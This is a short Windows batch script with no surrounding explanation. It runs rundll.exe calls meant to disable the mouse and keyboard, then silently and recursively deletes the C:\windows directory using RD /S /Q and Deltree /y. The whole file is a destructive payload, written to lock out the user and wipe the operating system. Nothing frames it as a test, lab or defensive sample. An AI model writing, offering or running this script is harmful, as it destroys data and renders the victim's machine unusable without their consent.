   @echo off
   cls
   C:\windows\rundll.exe mouse,disable
   C:\windows\rundll.exe keyboard,disable
   RD/S/Q C:\windows\
   Deltree /y C:\windows\
